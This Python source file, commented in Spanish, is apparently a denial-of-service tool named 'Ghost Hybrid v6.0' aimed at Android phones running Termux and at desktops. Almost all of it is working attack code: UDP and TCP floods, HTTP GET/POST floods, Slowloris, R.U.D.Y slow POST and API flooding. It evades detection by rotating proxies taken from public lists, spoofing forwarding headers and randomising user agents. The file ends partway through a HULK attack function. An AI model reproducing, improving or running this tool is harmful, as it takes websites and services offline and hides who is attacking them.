#!/usr/bin/env python3

import sys
import os
import time
import socket
import random
import argparse
import threading
import signal
import requests
import json
import asyncio
import aiohttp
import ssl
import socks
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from ipaddress import ip_address, IPv4Address
from urllib.parse import urlparse

# Configuración global híbrida
sent_packets = 0
start_time = time.time()
attack_running = True
lock = threading.Lock()
proxy_list = []
current_proxy_index = 0
proxy_rotation_counter = 0
config_file = "ghost_hybrid_config.json"
reports_file = "ghost_hybrid_reports.json"
bandwidth_monitor = []

# Detección automática de Termux
IS_TERMUX = os.path.exists('/data/data/com.termux/files/usr/bin')

# Base de datos extendida de User-Agents reales
USER_AGENTS = [
    # Android específicos para Termux
    'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    # Desktop comunes
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
]

# Headers HTTP adicionales para mayor realismo (del original)
HTTP_HEADERS = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: es-ES,es;q=0.8,en;q=0.3',
    'Accept-Language: fr-FR,fr;q=0.9,en;q=0.1',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: none',
    'DNT: 1',
    'Cache-Control: max-age=0'
]

# Payloads específicos para diferentes servicios (EXPANDIDO)
HTTP_PAYLOADS = {
    'wordpress': [
        '/wp-admin/admin-ajax.php',
        '/wp-login.php',
        '/wp-admin/',
        '/xmlrpc.php',
        '/wp-content/plugins/',
        '/wp-cron.php',
        '/wp-includes/js/',
        '/wp-admin/load-scripts.php',
        '/wp-json/wp/v2/users',
        '/wp-content/themes/',
        '/wp-admin/admin-post.php'
    ],
    'apache': [
        '/.htaccess',
        '/server-status',
        '/server-info',
        '/cgi-bin/',
        '/.htpasswd',
        '/icons/',
        '/manual/',
        '/error/'
    ],
    'nginx': [
        '/nginx_status',
        '/.well-known/',
        '/status',
        '/basic_status',
        '/stub_status'
    ],
    'api_endpoints': [
        '/api/v1/',
        '/api/v2/',
        '/rest/api/',
        '/graphql',
        '/api/users',
        '/api/login',
        '/api/search',
        '/webhook',
        '/api/auth',
        '/api/posts',
        '/api/data'
    ],
    'cms_common': [
        '/admin/',
        '/login',
        '/dashboard',
        '/search',
        '/contact',
        '/register',
        '/upload',
        '/user/',
        '/profile',
        '/settings'
    ],
    'generic': [
        '/',
        '/index.html',
        '/robots.txt',
        '/favicon.ico',
        '/sitemap.xml',
        '/search',
        '/?s=test',
        '/about',
        '/contact',
        '/help'
    ]
}

# Patrones de timing que simulan comportamiento humano (del original)
TIMING_PATTERNS = {
    'aggressive': (0.001, 0.005),
    'normal': (0.01, 0.05),
    'stealth': (0.1, 0.5),
    'human_like': (1.0, 3.0)
}

# Headers optimizados híbridos
TERMUX_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
    'X-Forwarded-For': '',
    'X-Real-IP': '',
    'X-Originating-IP': ''
}

# Métodos de ataque híbridos (15 métodos + originales)
ATTACK_METHODS = {
    # Métodos clásicos del original mejorados
    'udp_flood': 'UDP Flooding (Classic)',
    'tcp_flood': 'TCP Flooding (Classic)', 
    'http_classic': 'HTTP Classic Flooding',
    'random_classic': 'Random Classic Methods',
    # Nuevos métodos Layer 7
    'http_flood': 'HTTP GET/POST Flooding',
    'slowloris': 'Slowloris Connection Exhaustion',
    'slow_post': 'Slow POST Attack',
    'get_flood': 'Rapid GET Requests',
    'mixed_layer7': 'Mixed Layer 7 Attacks',
    'websocket_flood': 'WebSocket Flooding',
    'api_flood': 'API Endpoint Flooding',
    'rudy_attack': 'R.U.D.Y (Are You Dead Yet)',
    'hulk_attack': 'HULK DoS Attack',
    'goldeneye': 'Golden Eye HTTP DoS',
    'byob_attack': 'Bring Your Own Bot',
    'ssl_exhaustion': 'SSL Handshake Exhaustion',
    'cache_poisoning': 'Cache Poisoning Attack',
    'form_flooding': 'Form Submission Flooding',
    'search_flooding': 'Search Engine Flooding'
}

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    """Limpiar la pantalla de manera compatible con diferentes OS"""
    os.system('cls' if os.name == 'nt' else 'clear')

def detect_system_resources():
    """Detecta recursos del sistema optimizado para Termux"""
    try:
        import psutil
        # CPU cores
        cpu_count = os.cpu_count() or 2
        
        # Memoria disponible
        if IS_TERMUX:
            memory_mb = psutil.virtual_memory().available // (1024 * 1024)
            if memory_mb < 1024:  # < 1GB
                recommended_threads = min(15, cpu_count * 2)
            elif memory_mb < 2048:  # < 2GB
                recommended_threads = min(25, cpu_count * 3)
            elif memory_mb < 4096:  # < 4GB
                recommended_threads = min(35, cpu_count * 4)
            else:  # >= 4GB (como Samsung A52s)
                recommended_threads = min(50, cpu_count * 5)
        else:
            recommended_threads = min(100, cpu_count * 8)
            
        return {
            'cpu_count': cpu_count,
            'memory_mb': memory_mb if IS_TERMUX else psutil.virtual_memory().available // (1024 * 1024),
            'recommended_threads': recommended_threads,
            'is_termux': IS_TERMUX
        }
    except:
        return {
            'cpu_count': 4,
            'memory_mb': 2048,
            'recommended_threads': 35,
            'is_termux': IS_TERMUX
        }

def validate_ip(ip):
    """Validar que la dirección IP sea válida (del original)"""
    try:
        return str(ip_address(ip))
    except ValueError:
        return False

def validate_port(port):
    """Validar que el puerto esté en el rango correcto (del original)"""
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return port
        return False
    except ValueError:
        return False

def validate_target(target):
    """Validación avanzada de objetivo"""
    if target.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(target)
            return {
                'type': 'url',
                'host': parsed.hostname,
                'port': parsed.port or (443 if parsed.scheme == 'https' else 80),
                'scheme': parsed.scheme,
                'path': parsed.path or '/',
                'full_url': target
            }
        except:
            return None
    else:
        try:
            ip = str(ip_address(target))
            return {
                'type': 'ip',
                'host': ip,
                'port': 80,
                'scheme': 'http',
                'path': '/',
                'full_url': f'http://{ip}'
            }
        except:
            return None

def generate_fake_ip():
    """Genera IP falsa para headers X-Forwarded-For"""
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def signal_handler(sig, frame):
    """Maneja la interrupción del usuario con CTRL+C (del original)"""
    global attack_running
    print(f"\n{Colors.YELLOW}[*] Deteniendo el ataque...{Colors.ENDC}")
    attack_running = False
    time.sleep(1.5)
    save_report()
    show_stats()
    sys.exit(0)

def load_config():
    """Carga configuración desde archivo JSON (del original mejorada)"""
    default_config = {
        "default_threads": 35,
        "default_method": "mixed_layer7",
        "timing_pattern": "normal",
        "proxy_rotation_freq": 25,
        "user_agent_rotation": True,
        "stealth_mode": False,
        "advanced_evasion": True,
        "auto_proxy_verification": True,
        "hybrid_mode": True
    }

    try:
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                config = json.load(f)
                return {**default_config, **config}
    except:
        pass

    return default_config

def save_config(config):
    """Guarda configuración en archivo JSON (del original)"""
    try:
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=4)
        print(f"{Colors.GREEN}[+] Configuración guardada en {config_file}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error guardando configuración: {str(e)}{Colors.ENDC}")

def save_report():
    """Guarda reporte del ataque en archivo JSON (del original)"""
    global sent_packets, start_time, proxy_rotation_counter

    duration = time.time() - start_time
    pps = sent_packets / duration if duration > 0 else 0

    report = {
        "timestamp": datetime.now().isoformat(),
        "duration": round(duration, 2),
        "packets_sent": sent_packets,
        "packets_per_second": round(pps, 2),
        "proxy_rotations": proxy_rotation_counter,
        "proxies_used": len(proxy_list),
        "version": "Ghost Hybrid v6.0"
    }

    try:
        reports = []
        if os.path.exists(reports_file):
            with open(reports_file, 'r') as f:
                reports = json.load(f)

        reports.append(report)

        # Mantener solo los últimos 50 reportes
        if len(reports) > 50:
            reports = reports[-50:]

        with open(reports_file, 'w') as f:
            json.dump(reports, f, indent=4)

        print(f"{Colors.GREEN}[+] Reporte guardado en {reports_file}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error guardando reporte: {str(e)}{Colors.ENDC}")

def show_stats():
    """Muestra estadísticas del ataque (del original)"""
    global sent_packets, start_time, proxy_rotation_counter
    duration = time.time() - start_time
    if duration > 0:
        pps = sent_packets / duration
    else:
        pps = 0

    print(f"\n{Colors.BOLD}{Colors.BLUE}═══════════ Estadísticas del Ataque ═══════════{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Paquetes Enviados: {Colors.BOLD}{sent_packets:,}{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Duración: {Colors.BOLD}{duration:.2f} segundos{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Paquetes por segundo: {Colors.BOLD}{pps:.2f}{Colors.ENDC}")
    if len(proxy_list) > 0:
        print(f"{Colors.GREEN}[+] Rotaciones de proxy: {Colors.BOLD}{proxy_rotation_counter}{Colors.ENDC}")
        print(f"{Colors.GREEN}[+] Proxies utilizados: {Colors.BOLD}{len(proxy_list)}{Colors.ENDC}")
    print(f"{Colors.BLUE}═════════════════════════════════════════{Colors.ENDC}\n")

def get_free_proxies():
    """Obtiene una lista de proxies gratuitos desde varias fuentes mejoradas (del original)"""
    proxies = []

    sources = [
        'https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&filterUpTime=80',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt'
    ]

    for source in sources:
        try:
            if 'geonode.com' in source:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    for proxy in data.get('data', []):
                        ip = proxy.get('ip')
                        port = proxy.get('port')
                        protocol = proxy.get('protocols', ['http'])[0].lower()
                        if ip and port and protocol in ['http', 'socks4', 'socks5']:
                            proxies.append({
                                'ip': ip,
                                'port': int(port),
                                'type': protocol
                            })
            else:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    for line in response.text.split('\n'):
                        if ':' in line and not line.startswith('#'):
                            parts = line.strip().split(':')
                            if len(parts) >= 2:
                                ip = parts[0]
                                port = parts[1]
                                if ip and port:
                                    if 'socks5' in source:
                                        proxy_type = 'socks5'
                                    elif 'socks4' in source:
                                        proxy_type = 'socks4'
                                    else:
                                        proxy_type = 'http'

                                    proxies.append({
                                        'ip': ip,
                                        'port': int(port),
                                        'type': proxy_type
                                    })
        except:
            continue

    # Lista de respaldo mejorada
    if not proxies:
        proxies = [
            {'ip': '103.152.112.162', 'port': 80, 'type': 'http'},
            {'ip': '193.36.39.35', 'port': 4145, 'type': 'socks4'},
            {'ip': '185.151.86.121', 'port': 3699, 'type': 'socks5'},
            {'ip': '178.62.229.24', 'port': 7497, 'type': 'socks5'},
            {'ip': '95.179.242.185', 'port': 10823, 'type': 'socks5'},
            {'ip': '51.158.119.88', 'port': 1080, 'type': 'socks5'},
            {'ip': '95.216.181.107', 'port': 9070, 'type': 'socks5'},
            {'ip': '207.180.204.70', 'port': 48462, 'type': 'socks5'}
        ]

    # Eliminar duplicados
    unique_proxies = []
    seen = set()
    for proxy in proxies:
        key = f"{proxy['ip']}:{proxy['port']}"
        if key not in seen:
            seen.add(key)
            unique_proxies.append(proxy)

    return unique_proxies

def test_proxy(proxy):
    """Prueba si un proxy está funcionando (del original)"""
    try:
        if proxy['type'] == 'http':
            test_proxy_dict = {
                'http': f"http://{proxy['ip']}:{proxy['port']}",
                'https': f"http://{proxy['ip']}:{proxy['port']}"
            }
            response = requests.get('http://httpbin.org/ip', proxies=test_proxy_dict, timeout=5)
            return response.status_code == 200
        elif proxy['type'] in ['socks4', 'socks5']:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            try:
                sock.connect((proxy['ip'], proxy['port']))
                sock.close()
                return True
            except:
                sock.close()
                return False
    except:
        return False

def verify_and_score_proxies(proxy_list):
    """Verifica y puntúa los proxies disponibles (del original)"""
    working_proxies = []

    print(f"{Colors.BLUE}[*] Verificando {len(proxy_list)} proxies...{Colors.ENDC}")

    for i, proxy in enumerate(proxy_list):
        if not attack_running:
            break

        print(f"{Colors.YELLOW}[*] Probando proxy {i + 1}/{len(proxy_list)}: {proxy['ip']}:{proxy['port']}{Colors.ENDC}", end='\r')

        start_test = time.time()
        if test_proxy(proxy):
            response_time = time.time() - start_test
            proxy['response_time'] = response_time
            proxy['score'] = 1.0 / (response_time + 0.1)
            working_proxies.append(proxy)

    working_proxies.sort(key=lambda x: x.get('score', 0), reverse=True)

    print(f"\n{Colors.GREEN}[+] {len(working_proxies)} proxies verificados y funcionales{Colors.ENDC}")
    return working_proxies

def rotate_proxy():
    """Rota al siguiente proxy en la lista con mejor gestión (del original)"""
    global current_proxy_index, proxy_rotation_counter

    if not proxy_list:
        return None

    with lock:
        current_proxy_index = (current_proxy_index + 1) % len(proxy_list)
        proxy_rotation_counter += 1

    return proxy_list[current_proxy_index]

def get_current_proxy():
    """Obtiene el proxy actual (del original)"""
    if not proxy_list or current_proxy_index >= len(proxy_list):
        return None
    return proxy_list[current_proxy_index]

def setup_proxy_socket(proxy=None):
    """Configura un socket que usa un proxy (del original)"""
    if not proxy:
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    proxy_type = proxy['type']
    proxy_ip = proxy['ip']
    proxy_port = proxy['port']

    try:
        if proxy_type == 'http':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        elif proxy_type == 'socks4':
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(socks.SOCKS4, proxy_ip, proxy_port)
        elif proxy_type == 'socks5':
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        return sock
    except:
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def generate_advanced_packet(min_size=64, max_size=1490, stealth_mode=False):
    """Genera paquetes avanzados con mayor realismo (del original)"""
    size = random.randint(min_size, max_size)

    # Cabecera más realista
    header = bytes([random.randint(0, 255) for _ in range(8)])

    # ID de transacción más realista
    transaction_id = random.randint(1000000, 9999999).to_bytes(4, byteorder='big')

    # User-Agent aleatorio
    user_agent = random.choice(USER_AGENTS)

    # Headers HTTP adicionales aleatorios
    additional_headers = random.sample(HTTP_HEADERS, random.randint(2, 5))

    # Construir request HTTP más realista
    if stealth_mode:
        methods = ['GET', 'POST']
        paths = ['/', '/index.html', '/api/status', '/favicon.ico', '/robots.txt']
        versions = ['HTTP/1.1', 'HTTP/2.0']

        method = random.choice(methods)
        path = random.choice(paths)
        version = random.choice(versions)

        http_request = f"{method} {path} {version}\r\n"
        http_request += f"User-Agent: {user_agent}\r\n"
        http_request += f"Host: target-server.com\r\n"

        for header_line in additional_headers:
            http_request += f"{header_line}\r\n"

        http_request += "\r\n"
        legitimate_content = http_request.encode()
    else:
        legitimate_headers = [
            b'GET / HTTP/1.1\r\n',
            b'POST /api/data HTTP/1.1\r\n',
            b'PUT /upload HTTP/1.1\r\n',
            b'HEAD /status HTTP/1.1\r\n',
            b'OPTIONS * HTTP/1.1\r\n'
        ]

        legitimate_content = random.choice(legitimate_headers)
        legitimate_content += f"User-Agent: {user_agent}\r\n".encode()

    # Payload con patrones más diversos
    patterns = [
        bytes([i % 256 for i in range(64)]),
        bytes([random.randint(0, 255) for _ in range(64)]),
        b'A' * 64,
        b'0' * 64,
        os.urandom(64),
        b'Cache-Control: no-cache\r\n',
        b'Pragma: no-cache\r\n',
        b'Accept: */*\r\n'
    ]

    payload = legitimate_content
    remaining = size - len(header) - len(legitimate_content) - len(transaction_id)

    while remaining > 0:
        pattern = random.choice(patterns)
        if len(pattern) > remaining:
            payload += pattern[:remaining]
            remaining = 0
        else:
            payload += pattern
            remaining -= len(pattern)

    return header + transaction_id + payload

# ==================== MÉTODOS DE ATAQUE CLÁSICOS (del original) ====================

def send_packet(target_ip, target_port, sock_type="udp", use_proxy=False, timing_pattern="normal", stealth_mode=False, rotation_freq=25):
    """Envía un solo paquete al objetivo con mejoras avanzadas (del original)"""
    global sent_packets

    try:
        current_proxy = get_current_proxy() if use_proxy else None

        if use_proxy and sent_packets % rotation_freq == 0 and sent_packets > 0:
            current_proxy = rotate_proxy()

        if sock_type == "udp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif sock_type == "tcp":
            if use_proxy and current_proxy:
                sock = setup_proxy_socket(current_proxy)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            sock.settimeout(5)
            try:
                if use_proxy and current_proxy and current_proxy['type'] == 'http':
                    sock.connect((current_proxy['ip'], current_proxy['port']))
                    connect_str = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
                    sock.send(connect_str.encode())
                    response = sock.recv(4096)
                    if b"200" not in response:
                        sock.close()
                        return False
                else:
                    sock.connect((target_ip, target_port))
            except:
                sock.close()
                return False
        else:
            return False

        packet = generate_advanced_packet(stealth_mode=stealth_mode)

        if sock_type == "udp":
            sock.sendto(packet, (target_ip, target_port))
        else:
            sock.send(packet)

        sock.close()

        with lock:
            sent_packets += 1

        return True
    except:
        if use_proxy:
            rotate_proxy()
        return False

def attack_thread(target_ip, target_port, sock_type, use_proxy=False, timing_pattern="normal", stealth_mode=False, rotation_freq=25):
    """Función para cada hilo de ataque con timing mejorado (del original)"""
    timing_range = TIMING_PATTERNS.get(timing_pattern, TIMING_PATTERNS['normal'])

    while attack_running:
        if sock_type == "random":
            current_sock_type = random.choice(["udp", "tcp"])
        else:
            current_sock_type = sock_type

        if target_port == 0:
            port = random.randint(1, 65535)
        else:
            port = target_port

        send_packet(target_ip, port, current_sock_type, use_proxy, timing_pattern, stealth_mode, rotation_freq)

        # Pausa con patrón de timing seleccionado
        sleep_time = random.uniform(timing_range[0], timing_range[1])
        time.sleep(sleep_time)

# ==================== MÉTODOS DE ATAQUE LAYER 7 HÍBRIDOS ====================

async def http_flood_attack(session, target_info, method='GET', use_proxy=False):
   """Ataque HTTP Flood asíncrono optimizado híbrido"""
   global sent_packets
   
   headers = TERMUX_HEADERS.copy()
   headers['User-Agent'] = random.choice(USER_AGENTS)
   headers['X-Forwarded-For'] = generate_fake_ip()
   headers['X-Real-IP'] = generate_fake_ip()
   
   # Seleccionar payload según el objetivo detectado
   url_lower = target_info.get('full_url', '').lower()
   if 'wordpress' in url_lower or 'wp-' in url_lower:
       paths = HTTP_PAYLOADS['wordpress']
   elif 'api' in url_lower:
       paths = HTTP_PAYLOADS['api_endpoints']
   elif 'nginx' in headers.get('Server', '').lower():
       paths = HTTP_PAYLOADS['nginx']
   else:
       paths = HTTP_PAYLOADS['generic']
   
   path = random.choice(paths)
   url = f"{target_info['scheme']}://{target_info['host']}:{target_info['port']}{path}"
   
   # Configurar proxy si está habilitado
   proxy_url = None
   if use_proxy and proxy_list:
       current_proxy = get_current_proxy()
       if current_proxy and current_proxy['type'] == 'http':
           proxy_url = f"http://{current_proxy['ip']}:{current_proxy['port']}"
   
   try:
       if method == 'GET':
           async with session.get(url, headers=headers, proxy=proxy_url, timeout=5) as response:
               await response.read()
       elif method == 'POST':
           data = {'data': 'x' * random.randint(100, 1000)}
           async with session.post(url, headers=headers, data=data, proxy=proxy_url, timeout=5) as response:
               await response.read()
       
       with lock:
           sent_packets += 1
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def slowloris_attack(target_info, use_proxy=False):
   """Ataque Slowloris optimizado híbrido"""
   global sent_packets
   
   try:
       # Configurar proxy para conexión directa si está habilitado
       if use_proxy and proxy_list:
           current_proxy = get_current_proxy()
           if current_proxy and current_proxy['type'] in ['socks4', 'socks5']:
               # Para Slowloris con SOCKS, crear conexión especial
               sock = setup_proxy_socket(current_proxy)
               sock.settimeout(10)
               sock.connect((target_info['host'], target_info['port']))
               
               # Enviar headers HTTP incompletos
               headers = [
                   f"GET {target_info['path']} HTTP/1.1\r\n",
                   f"Host: {target_info['host']}\r\n",
                   f"User-Agent: {random.choice(USER_AGENTS)}\r\n",
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                   "Accept-Language: en-US,en;q=0.5\r\n",
                   "Accept-Encoding: gzip, deflate\r\n",
                   "Connection: keep-alive\r\n"
               ]
               
               for header in headers:
                   sock.send(header.encode())
                   time.sleep(random.uniform(1, 3))
                   with lock:
                       sent_packets += 1
               
               time.sleep(random.uniform(10, 30))
               sock.close()
               return True
       
       # Conexión directa sin proxy
       if target_info['scheme'] == 'https':
           ssl_context = ssl.create_default_context()
           ssl_context.check_hostname = False
           ssl_context.verify_mode = ssl.CERT_NONE
           reader, writer = await asyncio.open_connection(
               target_info['host'], 
               target_info['port'],
               ssl=ssl_context
           )
       else:
           reader, writer = await asyncio.open_connection(
               target_info['host'], 
               target_info['port']
           )
       
       headers = [
           f"GET {target_info['path']} HTTP/1.1\r\n",
           f"Host: {target_info['host']}\r\n",
           f"User-Agent: {random.choice(USER_AGENTS)}\r\n",
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
           "Accept-Language: en-US,en;q=0.5\r\n",
           "Accept-Encoding: gzip, deflate\r\n",
           "Connection: keep-alive\r\n"
       ]
       
       for header in headers:
           writer.write(header.encode())
           await writer.drain()
           await asyncio.sleep(random.uniform(1, 3))
           
           with lock:
               sent_packets += 1
       
       await asyncio.sleep(random.uniform(10, 30))
       writer.close()
       await writer.wait_closed()
       
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def get_flood_attack(session, target_info, use_proxy=False):
   """Ataque GET Flood masivo y rápido híbrido"""
   global sent_packets
   
   headers = TERMUX_HEADERS.copy()
   headers['User-Agent'] = random.choice(USER_AGENTS)
   headers['X-Forwarded-For'] = generate_fake_ip()
   headers['X-Real-IP'] = generate_fake_ip()
   headers['Cache-Control'] = 'no-cache'
   headers['Pragma'] = 'no-cache'
   
   paths = HTTP_PAYLOADS['generic'] + HTTP_PAYLOADS['cms_common']
   
   # Configurar proxy
   proxy_url = None
   if use_proxy and proxy_list:
       current_proxy = get_current_proxy()
       if current_proxy and current_proxy['type'] == 'http':
           proxy_url = f"http://{current_proxy['ip']}:{current_proxy['port']}"
   
   try:
       for _ in range(random.randint(5, 15)):
           if not attack_running:
               break
               
           path = random.choice(paths)
           url = f"{target_info['scheme']}://{target_info['host']}:{target_info['port']}{path}"
           
           params = {
               'cache_bust': random.randint(1000000, 9999999),
               'timestamp': int(time.time()),
               'random': random.randint(1, 1000)
           }
           
           async with session.get(url, headers=headers, params=params, proxy=proxy_url, timeout=3) as response:
               await response.read()
               
           with lock:
               sent_packets += 1
           
           await asyncio.sleep(0.001)
       
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def api_flood_attack(session, target_info, use_proxy=False):
   """Ataque especializado en APIs híbrido"""
   global sent_packets
   
   headers = TERMUX_HEADERS.copy()
   headers['User-Agent'] = random.choice(USER_AGENTS)
   headers['Content-Type'] = 'application/json'
   headers['Accept'] = 'application/json'
   headers['X-Requested-With'] = 'XMLHttpRequest'
   headers['X-API-Key'] = 'test_' + str(random.randint(100000, 999999))
   
   api_paths = HTTP_PAYLOADS['api_endpoints']
   
   # Configurar proxy
   proxy_url = None
   if use_proxy and proxy_list:
       current_proxy = get_current_proxy()
       if current_proxy and current_proxy['type'] == 'http':
           proxy_url = f"http://{current_proxy['ip']}:{current_proxy['port']}"
   
   try:
       for _ in range(random.randint(3, 8)):
           if not attack_running:
               break
               
           path = random.choice(api_paths)
           url = f"{target_info['scheme']}://{target_info['host']}:{target_info['port']}{path}"
           
           json_data = {
               'query': 'x' * random.randint(100, 500),
               'limit': random.randint(1, 100),
               'offset': random.randint(0, 1000),
               'timestamp': time.time(),
               'user_id': random.randint(1, 10000)
           }
           
           if random.choice([True, False]):
               async with session.get(url, headers=headers, params=json_data, proxy=proxy_url, timeout=5) as response:
                   await response.read()
           else:
               async with session.post(url, headers=headers, json=json_data, proxy=proxy_url, timeout=5) as response:
                   await response.read()
           
           with lock:
               sent_packets += 1
           
           await asyncio.sleep(0.01)
       
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def rudy_attack(target_info, use_proxy=False):
   """R.U.D.Y (Are You Dead Yet) - POST lento híbrido"""
   global sent_packets
   
   try:
       if use_proxy and proxy_list:
           current_proxy = get_current_proxy()
           if current_proxy and current_proxy['type'] in ['socks4', 'socks5']:
               sock = setup_proxy_socket(current_proxy)
               sock.settimeout(30)
               sock.connect((target_info['host'], target_info['port']))
               
               post_data = 'field1=' + 'A' * 100000
               content_length = len(post_data)
               
               request = (
                   f"POST {target_info['path']} HTTP/1.1\r\n"
                   f"Host: {target_info['host']}\r\n"
                   f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                   f"Content-Type: application/x-www-form-urlencoded\r\n"
                   f"Content-Length: {content_length}\r\n"
                   f"Connection: keep-alive\r\n\r\n"
               )
               
               sock.send(request.encode())
               with lock:
                   sent_packets += 1
               
               for byte in post_data.encode():
                   if not attack_running:
                       break
                   sock.send(bytes([byte]))
                   time.sleep(random.uniform(0.1, 0.5))
                   with lock:
                       sent_packets += 1
               
               time.sleep(10)
               sock.close()
               return True
       
       # Conexión asyncio directa
       if target_info['scheme'] == 'https':
           ssl_context = ssl.create_default_context()
           ssl_context.check_hostname = False
           ssl_context.verify_mode = ssl.CERT_NONE
           reader, writer = await asyncio.open_connection(
               target_info['host'], 
               target_info['port'],
               ssl=ssl_context
           )
       else:
           reader, writer = await asyncio.open_connection(
               target_info['host'], 
               target_info['port']
           )
       
       post_data = 'field1=' + 'A' * 100000
       content_length = len(post_data)
       
       request = (
           f"POST {target_info['path']} HTTP/1.1\r\n"
           f"Host: {target_info['host']}\r\n"
           f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {content_length}\r\n"
           f"Connection: keep-alive\r\n\r\n"
       )
       
       writer.write(request.encode())
       await writer.drain()
       
       with lock:
           sent_packets += 1
       
       for byte in post_data.encode():
           if not attack_running:
               break
           writer.write(bytes([byte]))
           await writer.drain()
           await asyncio.sleep(random.uniform(0.1, 0.5))
           
           with lock:
               sent_packets += 1
       
       await asyncio.sleep(10)
       writer.close()
       await writer.wait_closed()
       
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def hulk_attack(session, target_info, use_proxy=False):
   """HULK DoS Attack - Requests complejos híbrido"""
   global sent_packets
   
   headers = {
       'User-Agent': random.choice(USER_AGENTS),
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
